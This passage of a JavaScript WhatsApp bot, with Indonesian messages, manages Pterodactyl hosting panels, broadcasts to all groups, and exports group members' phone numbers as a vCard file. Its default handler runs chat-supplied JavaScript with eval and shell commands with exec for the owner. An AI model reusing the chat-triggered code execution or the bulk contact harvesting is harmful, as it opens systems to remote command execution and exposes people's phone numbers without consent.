					const participants = await groupMetadataa.participants;
					const kazuya = await participants
						.filter((v) => v.id.endsWith(".net"))
						.map((v) => v.id);
					for (let member of kazuya) {
						if (member === m.sender) {
							contacts.push(member);
							fs.writeFileSync("./database/contacts.json");
							JSON.stringify(contacts);
						}
					}
					try {
						const uniqueContacts = [...new Set(contacts)];
						const vcardContent = uniqueContacts
							.map((contact, index) => {
								const vcard = [
									"BEGIN:VCARD",
									"VERSION:3.0",
									`FN:${nama} [${index}]`,
									`TEL;type=CELL;type=VOICE;waid=${
										contact.split("@")[0]
									}:+${contact.split("@")[0]}`,
									"END:VCARD",
									""
								].join("\n");
								return vcard;
							})
							.join("");
						fs.writeFileSync(
							"./database/contacts.vcf",
							vcardContent,
							"utf8"
						);
					} catch (err) {
						m.reply(err.toString());
					} finally {
						if (m.chat !== m.sender)
							await m.reply(
								`File Kontak Berhasil Dikirim ke Private Chat`
							);
						await xzuya.sendMessage(
							m.sender,
							{
								document: fs.readFileSync(
									"./database/contacts.vcf"
								),
								fileName: "contacts.vcf",
								caption: "File Contact Berhasil Di Buat✅",
								mimetype: "text/vcard"
							},
							{ quoted: m }
						);
						contacts.splice(0, contacts.length);
						await fs.writeFileSync(
							"./database/contacts.json",
							JSON.stringify(contacts)
						);
						await fs.writeFileSync("./database/contacts.vcf", "");
					}
				}
				break;
			case "delpanel":
			case "dellpanel":
				{
					if (!isCreator) return vipReply(mess.owner);
					if (!text) return vipReply(`${command + prefix} 321`);
					let f = await fetch(
						domain + "/api/application/servers?page=1",
						{
							method: "GET",
							headers: {
								Accept: "application/json",
								"Content-Type": "application/json",
								Authorization: "Bearer " + apikey
							}
						}
					);
					let result = await f.json();
					let servers = result.data;
					let sections = [];
					for (let server of servers) {
						let s = server.attributes;
						if (text == s.id.toString()) {
							sections.push(s.name.toLowerCase());
							let f = await fetch(
								domain + `/api/application/servers/${s.id}`,
								{
									method: "DELETE",
									headers: {
										Accept: "application/json",
										"Content-Type": "application/json",
										Authorization: "Bearer " + apikey
									}
								}
							);
							let res = f.ok
								? {
										errors: null
								  }
								: await f.json();
						}
					}
					let cek = await fetch(
						domain + "/api/application/users?page=1",
						{
							method: "GET",
							headers: {
								Accept: "application/json",
								"Content-Type": "application/json",
								Authorization: "Bearer " + apikey
							}
						}
					);
					let res2 = await cek.json();
					let users = res2.data;
					for (let user of users) {
						let u = user.attributes;
						if (sections.includes(u.username)) {
							let delusr = await fetch(
								domain + `/api/application/users/${u.id}`,
								{
									method: "DELETE",
									headers: {
										Accept: "application/json",
										"Content-Type": "application/json",
										Authorization: "Bearer " + apikey
									}
								}
							);
							let res = delusr.ok
								? {
										errors: null
								  }
								: await delusr.json();
						}
					}
					if (sections.length == 0)
						return m.reply("*ID Server/User* Tidak Ditemukan");
					m.reply(
						`Berhasil Menghapus Akun Panel *${capital(
							sections[0]
						)}*`
					);
				}
				break;

			case "addpanel":
			case "buatpanel":
				{
					if (!isPremium) return m.reply(mess.prem);
					if (global.apikey.length < 1)
						return m.reply(`Apikey not Found`);
					if (!text)
						return m.reply(
							`Example : ${prefix + command} nama|2gb|62345709875`
						);
					let [nama, kapasitas, nomor] = text.split("|");
					if (!isNaN(nama))
						return m.reply(
							`Example : ${prefix + command} nama|2gb|62345709875`
						);
					let cpu;
					let ram;
					let disk;
					let username = nama.toLowerCase();
					const kapasitasData = {
						"1gb": { cpu: "30", ram: "1000", disk: "1000" },
						"2gb": { cpu: "40", ram: "2000", disk: "2000" },
						"3gb": { cpu: "50", ram: "3000", disk: "2000" },
						"4gb": { cpu: "60", ram: "4000", disk: "2000" },
						"5gb": { cpu: "70", ram: "5000", disk: "2000" },
						"6gb": { cpu: "80", ram: "6000", disk: "3000" },
						"7gb": { cpu: "90", ram: "7000", disk: "3000" },
						"8gb": { cpu: "100", ram: "8000", disk: "3000" },
						"9gb": { cpu: "110", ram: "9000", disk: "3000" },
						"10gb": { cpu: "120", ram: "10000", disk: "4000" },
						"11gb": { cpu: "140", ram: "11000", disk: "5000" },
						"12gb": { cpu: "150", ram: "12000", disk: "5000" },
						unli: { cpu: "0", ram: "0", disk: "4000" },
						unlimited: { cpu: "0", ram: "0", disk: "4000" }
					};

					if (kapasitasData[kapasitas]) {
						({ cpu, ram, disk } = kapasitasData[kapasitas]);
					} else {
						return m.reply("Format Ram Tidak Ditemukan!");
					}

					let email = username + "@gmail.com";
					let name = capital(nama);
					let password = getRandom(name);
					let f = await fetch(domain + "/api/application/users", {
						method: "POST",

						headers: {
							Accept: "application/json",
							"Content-Type": "application/json",
							Authorization: "Bearer " + apikey
						},
						body: JSON.stringify({
							email: email,
							username: username.toLowerCase(),
							first_name: name,
							last_name: "Server",
							language: "en",
							password: password.toString()
						})
					});
					let data = await f.json();
					if (data.errors)
						return m.reply(JSON.stringify(data.errors[0], null, 2));
					let user = data.attributes;
					let desc = tanggal;
					let usr_id = user.id;
					let f1 = await fetch(
						domain + "/api/application/nests/5/eggs/" + egg,
						{
							method: "GET",
							headers: {
								Accept: "application/json",
								"Content-Type": "application/json",
								Authorization: "Bearer " + apikey
							}
						}
					);
					let data2 = await f1.json();
					let startup_cmd = data2.attributes.startup;
					let f2 = await fetch(domain + "/api/application/servers", {
						method: "POST",
						headers: {
							Accept: "application/json",
							"Content-Type": "application/json",
							Authorization: "Bearer " + apikey
						},
						body: JSON.stringify({
							name: name,
							description: desc,
							user: usr_id,
							egg: parseInt(egg),
							docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
							startup: startup_cmd,
							environment: {
								INST: "npm",
								USER_UPLOAD: "0",
								AUTO_UPDATE: "0",
								CMD_RUN: "npm start"
							},
							limits: {
								memory: ram,
								swap: 0,
								disk: disk,
								io: 500,
								cpu: cpu
							},
							feature_limits: {
								databases: 5,
								backups: 5,
								allocations: 5
							},
							deploy: {
								locations: [parseInt(loc)],
								dedicated_ip: false,
								port_range: []
							}
						})
					});
					let result = await f2.json();
					if (result.errors)
						return m.reply(
							JSON.stringify(result.errors[0], null, 2)
						);
					let server = result.attributes;
					let teksnya = `
*Berikut Data panel anda*
> tunggu 2-3 menit sebelum login

* *ID :* ${user.id}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.split("0")[0] + "GB"}
* *CPU :* ${cpu == "0" ? "Unlimited" : cpu + "%"}
* *Storage :* ${disk.charAt(0) + "GB"}
* *Created :* ${desc}
* *Login Link ⬇️*
${domain}`;
					await xzuya.sendMessage(
						nomor + "@s.whatsapp.net",
						{ text: teksnya },
						{ quoted: fVerif }
					);
					vipReply(
						`\`Succes Create ID :\` *${user.id}*
						Data Sudah di kirim ke private chat\n \`Tunggu 5 Menit sebelum Create panel\` `
					);
				}
				break;
			case "listpanel":
			case "listp":
			case "listserver":
				{
					if (global.apikey.length < 1)
						return m.reply("Apikey Tidak Ditemukan!");
					if (!isCreator) return vipReply(mess.owner);
					let f = await fetch(
						domain + "/api/application/servers?page=1",
						{
							method: "GET",
							headers: {
								Accept: "application/json",
								"Content-Type": "application/json",
								Authorization: "Bearer " + apikey
							}
						}
					);
					let res = await f.json();
					let servers = res.data;
					if (servers.length < 1)
						return m.reply("Tidak Ada Server Bot");
					let messageText =
						"*🌐 LIST SERVER PANEL BOT BAYZZ4YOU*\n\n";
					for (let server of servers) {
						let s = server.attributes;
						let f3 = await fetch(
							domain +
								"/api/client/servers/" +
								s.uuid.split`-`[0] +
								"/resources",
							{
								method: "GET",
								headers: {
									Accept: "application/json",
									"Content-Type": "application/json",
									Authorization: "Bearer " + capikey
								}
							}
						);
						let data = await f3.json();
						let status = data.attributes
							? data.attributes.current_state
							: s.status;
						messageText += `*┌ ◦* ID Server *${s.id}*\n`;
						messageText += `*│ ◦* Nama Server *${s.name}*\n`;
						messageText += `*│ ◦* Ram *${
							s.limits.memory == 0
								? "Unlimited"
								: s.limits.memory.length > 3
								? s.limits.memory.toString().charAt(1) + "GB"
								: s.limits.memory.toString().charAt(0) + "GB"
						}*\n`;
						messageText += `*│ ◦* CPU *${
							s.limits.cpu == 0
								? "Unlimited"
								: s.limits.cpu.toString() + "%"
						}*\n`;
						messageText += `*└ ◦* Storage *${
							s.limits.disk == 0
								? "Unlimited"
								: s.limits.disk.length > 3
								? s.limits.disk.toString().charAt(1) + "GB"
								: s.limits.disk.toString().charAt(0) + "GB"
						}*\n\n`;
					}

					messageText += ` Total Server : *${res.meta.pagination.count} Server*`;

					await xzuya.sendMessage(
						m.chat,
						{ text: messageText },
						{ quoted: m }
					);
				}
				break;
			case "listadmin":
				{
					let cek = await fetch(
						domain + "/api/application/users?page=1",
						{
							method: "GET",
							headers: {
								Accept: "application/json",
								"Content-Type": "application/json",
								Authorization: "Bearer " + apikey
							}
						}
					);
					let res2 = await cek.json();
					let users = res2.data;
					if (users.length < 1)
						return m.reply("Tidak Ada Admin Panel");
					let teksnya = "*🌐 LIST ADMIN PANEL*\n\n";
					await users.forEach((i) => {
						if (i.attributes.root_admin !== true) return;
						teksnya += `*┌ ◦* ID User *${i.attributes.id}*
*└ ◦* Nama *${i.attributes.first_name}*\n\n`;
					});
					m.reply(teksnya);
				}
				break;
			case "deladmin":
				{
					if (!isCreator) return vipReply(mess.owner);
					if (!text)
						return m.reply(
							"id\n\nuntuk melihat id admin ketik *.listadmin*"
						);
					let cek = await fetch(
						domain + "/api/application/users?page=1",
						{
							method: "GET",
							headers: {
								Accept: "application/json",
								"Content-Type": "application/json",
								Authorization: "Bearer " + apikey
							}
						}
					);
					let res2 = await cek.json();
					let users = res2.data;
					let getid = null;
					let idadmin = null;
					await users.forEach(async (e) => {
						if (
							e.attributes.id == text &&
							e.attributes.root_admin == true
						) {
							getid = e.attributes.username;
							idadmin = e.attributes.id;
							let delusr = await fetch(
								domain + `/api/application/users/${idadmin}`,
								{
									method: "DELETE",
									headers: {
										Accept: "application/json",
										"Content-Type": "application/json",
										Authorization: "Bearer " + apikey
									}
								}
							);
							let res = delusr.ok
								? {
										errors: null
								  }
								: await delusr.json();
						}
					});
					if (idadmin == null)
						return m.reply("ID Admin Tidak Ditemukan!");
					m.reply(
						`Berhasil Menghapus Admin Panel *${capital(getid)}*`
					);
				}
				break;
			case "addadmin":
				{
					if (!isOwner) return m.reply(mess.owner);
					if (!text)
						return vipReply(
							`Example: ${prefix + command} kazuya|62xxx`
						);
					const [username, nomor] = text.split("|");
					const email = `${username.toLowerCase()}@gmail.com`;
					const name = capital(text);
					const password = `${username}${crypto
						.randomBytes(2)
						.toString("hex")}`;

					const body = JSON.stringify({
						email,
						username: username.toLowerCase(),
						first_name: name,
						last_name: "Admin",
						root_admin: true,
						language: "en",
						password
					});

					try {
						const response = await fetch(
							`${domain}/api/application/users`,
							{
								method: "POST",
								headers: {
									Accept: "application/json",
									"Content-Type": "application/json",
									Authorization: `Bearer ${apikey}`
								},
								body
							}
						);

						const data = await response.json();

						if (data.errors) {
							return m.reply(
								JSON.stringify(data.errors[0], null, 2)
							);
						}

						const user = data.attributes;
						const textNya = `
*Berhasil Membuat Admin Panel ✅*

* *ID :* ${user.id}
* *Username :* ${user.username.toLowerCase()}
* *Password :* ${password}
* *Login Link ⬇️*
${domain}`;

						xzuya.sendMessage(
							nomor,
							{ text: textNya },
							{ quoted: fVerif }
						);
					} catch (error) {
						console.error("Error creating admin:", error);
						m.reply(
							"Terjadi kesalahan saat membuat admin. Coba lagi nanti."
						);
					}
				}
				break;
			case "info":
				{
					if (!isCreator) return vipReply(mess.owner);
					const listGrup = "";
					for (let i in db.groups) {
						await jeda(5900);
						xzuya.sendMessage(
							i,
							{
								text,
								contextInfo: {
									isForwarded: true,
									forwardingScore: 127,
									forwardedNewsletterMessageInfo: {
										newsletterJid: my.ch,
										serverMessageId: null,
										newsletterName:
											"Gabung untuk mendapatkan informasi terbaru"
									}
								}
							},
							{ quoted: fkontak }
						);
					}
				}
				break;
			default:
				if (budy.startsWith(">")) {
					if (!isCreator) return;
					try {
						let evaled = await eval(budy.slice(2));
						if (typeof evaled !== "string")
							evaled = require("util").inspect(evaled);
						await m.reply(evaled);
					} catch (err) {
						await m.reply(String(err));
					}
				}
				if (budy.startsWith("<")) {
					if (!isCreator) return;
					try {
						let evaled = await eval(
							`(async () => { ${budy.slice(2)} })()`
						);
						if (typeof evaled !== "string")
							evaled = require("util").inspect(evaled);
						await m.reply(evaled);
					} catch (err) {
						await m.reply(String(err));
					}
				}
				if (budy.startsWith("$")) {
					if (!isCreator) return;
					if (!text) return;
					exec(budy.slice(2), (err, stdout) => {
						if (err) return m.reply(`${err}`);
						if (stdout) return m.reply(stdout);
					});
				}
		}
	} catch (err) {
		console.log(util.format(err));
		//m.reply('*❗ Internal server error️*');
		// xzuya.sendFromOwner(
		// 			owner,
		// 			"Halo sayang, sepertinya ada yang error nih, jangan lupa diperbaiki ya\n\n*Log error:*\n\n" +
		// 				util.format(err),
		// 			m,
		// 			{ contextInfo: { isForwarded: true } }
		// 		);
	}
};

let file = require.resolve(__filename);
fs.watchFile(file, () => {
	fs.unwatchFile(file);
	console.log(chalk.redBright(`Update ${__filename}`));
	delete require.cache[file];
	require(file);
});
